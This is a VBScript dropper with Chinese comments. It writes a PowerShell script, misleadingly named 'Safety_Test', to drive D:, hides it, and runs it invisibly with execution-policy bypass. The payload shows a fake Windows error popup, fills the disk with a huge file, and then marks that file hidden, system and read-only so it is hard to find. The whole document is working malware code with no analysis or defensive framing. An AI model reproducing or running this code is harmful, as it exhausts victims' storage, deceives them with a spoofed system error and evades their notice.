Set fso = CreateObject("Scripting.FileSystemObject")
Set WshShell = CreateObject("WScript.Shell")

' 1. 定义生成的脚本路径
psPath = "D:\Safety_Test.ps1"

' 2. 将你的完整 PowerShell 代码写入文件
' 使用 Chr(34) 来处理代码中的双引号
Set psFile = fso.CreateTextFile(psPath, True)
psFile.WriteLine "$TargetDir = " & Chr(34) & "D:\" & Chr(34)
psFile.WriteLine "$BigFile = Join-Path $TargetDir " & Chr(34) & "core_dump.txt" & Chr(34)
psFile.WriteLine "if (!(Test-Path $TargetDir)) { New-Item $TargetDir -ItemType Directory -Force | Out-Null }"
psFile.WriteLine "Add-Type -AssemblyName PresentationFramework"
psFile.WriteLine "$Popup = [powershell]::Create().AddScript({ [System.Windows.MessageBox]::Show('Windows Version Error: build 23H2 incompatible.', 'System Error', 0, 16) })"
psFile.WriteLine "$null = $Popup.BeginInvoke()"
psFile.WriteLine "$Stream = [System.IO.File]::OpenWrite($BigFile)"
psFile.WriteLine "$Buffer = New-Object Byte[] 53687091200"
psFile.WriteLine "for($i=1; $i -le 1024; $i++) { $Stream.Write($Buffer, 0, $Buffer.Length); Start-Sleep -Milliseconds 55 }"
psFile.WriteLine "$Stream.Close()"
psFile.WriteLine "attrib +h +s +r $BigFile"
psFile.Close

' 3. 强力隐藏 Safety_Test.ps1 脚本本身 (2=隐藏, 4=系统文件)
Set f = fso.GetFile(psPath)
f.Attributes = 2 + 4

' 4. 以“零窗口”模式自动启动该脚本
' 0 代表隐藏窗口, False 代表脚本启动后 VBS 立即结束，不留痕迹
WshShell.Run "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File " & psPath, 0, False

Set fso = Nothing
Set WshShell = Nothing